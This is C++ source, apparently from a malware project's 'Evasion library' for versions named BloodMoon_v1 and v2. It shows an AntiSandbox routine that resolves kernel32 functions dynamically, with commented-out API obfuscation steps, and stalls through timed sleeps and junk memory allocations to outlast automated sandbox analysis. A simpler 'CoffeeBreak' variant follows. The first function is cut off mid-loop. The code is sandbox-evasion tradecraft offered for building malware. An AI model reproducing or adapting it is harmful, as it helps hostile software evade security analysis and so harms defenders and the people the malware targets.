
// From Evasion library for BloodMoon_v1
void Evasion::AntiSandbox() {

	int counter = m_Loops;
	//getKey(microsoft_key, sizeof(microsoft_key) / sizeof(microsoft_key[0]));
	//getDLL(kern32, sizeof(kern32) / sizeof(kern32[0]));

	while (counter != 0) {

		// Decrypt
		//ObfuscateAPIs();
		GetProcessHeap_t pGetProcessHeap = (GetProcessHeap_t)Resolve(kern32, get_heap);
		HeapAlloc_t pHeapAlloc = (HeapAlloc_t)Resolve(kern32, heap_alloc);
		RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)Resolve(kern32, rtl_move);
		VirtualAlloc_t pVirtAlloc = (VirtualAlloc_t)Resolve(kern32, virt_alloc);
		VirtualFree_t pVirtFree = (VirtualFree_t)Resolve(kern32, virt_free);
		Sleep_t pSleep = (Sleep_t)Resolve(kern32, sleep_some);
		pSleep(0x10 + m_SleepIncrement);

		// Re-encrypt
		//ObfuscateAPIs();

		// Allocate some memory .. for no reason..
		HANDLE hHeap = pGetProcessHeap();

		LPVOID mem = pVirtAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		char randomBuff[100] = { 0x00 };

		for (int i = 0; i < 100; i++) {

			randomBuff[i] = (i * 5) - 100 + 12;
		}

		pRtlMoveMemory(mem, randomBuff, 100);

		pSleep(0x580 + m_SleepIncrement);

		if (counter % 2 == 0)
			pVirtFree(mem, 0, MEM_RELEASE);

		counter -= 1;

		pSleep(0x10 + m_SleepIncrement);



// Simplified version for BloodMoon_v2
void CoffeeBreak(int loops=1000) {
	int counter = 0;
	char junk[1] = { 0x0 };
	HANDLE hHeap = ::GetProcessHeap();
	LPVOID wasted_mem = HeapAlloc(hHeap, HEAP_NO_SERIALIZE, 0x1000);

	for (int i = 0; i < loops; i++) {
	
		if (counter % 2) {
			junk[0] = { 0x5 };
			Sleep(500);
		}
		
		else if (counter % 5) {
		HeapReAlloc(hHeap, HEAP_NO_SERIALIZE, wasted_mem, 1024 * (counter % 5));
		}

		memcpy(wasted_mem, junk, 0x1);

		counter += 1;
	}
}
